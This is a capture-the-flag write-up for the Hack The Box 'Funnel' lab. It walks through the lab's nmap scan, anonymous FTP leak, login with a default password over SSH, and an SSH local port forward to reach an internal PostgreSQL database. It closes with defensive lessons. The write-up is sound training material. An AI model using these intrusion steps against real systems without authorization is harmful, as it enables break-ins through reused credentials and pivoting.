# Funnel

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 1) |
| **OS** | Linux |
| **Difficulty** | Very Easy (first pivoting box) |
| **Techniques** | Anonymous FTP, default creds, SSH local port forwarding (pivoting), PostgreSQL |

## Overview
Anonymous FTP leaks onboarding docs with a default password; the reused credential gets
SSH access, and an internal PostgreSQL reachable only on localhost is reached by
tunnelling through SSH. My first pivoting box and a core OSCP AD-set skill.

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>       # 21 ftp, 22 ssh
ftp <TARGET_IP>                              # anonymous -> mail_backup/
# welcome email -> local-part usernames (optimus, albert, andreas, christine, maria)
# password_policy.pdf -> default password (read it: pdftotext password_policy.pdf -)
ssh christine@<TARGET_IP>                    # default password still set
ss -tln                                      # 127.0.0.1:5432 postgres, localhost only
```

## Exploitation (pivot)
```bash
# open a local port that forwards through SSH to the target's localhost:5432
ssh -N -f -L 127.0.0.1:9999:127.0.0.1:5432 christine@<TARGET_IP>
psql -h 127.0.0.1 -p 9999 -U christine        # NOT -U postgres
\l ; \c secrets ; \dt ; select * from flag;
```

## Key Takeaway
Change default credentials, segment internal services, and monitor for tunnelling.
Local port forwarding reaches any TCP service that was "protected" only by being bound
to localhost; this is the foundation of pivoting.

## What tripped me up
- The reused credential follows the USER ACCOUNT, not the default `postgres` role. The
  onboarding email said "your accounts," so I deduced the DB role was `christine`, not
  `postgres`. Trusting the evidence over the obvious default was the key move.
- Use `127.0.0.1`, never `localhost`, on both ends of `-L` and in psql, because
  `localhost` can resolve to IPv6 `::1` while the tunnel and service live on IPv4.
- `ssh user@host something` runs `something` as a remote command and exits; the
  interactive shell is just `ssh user@host`.
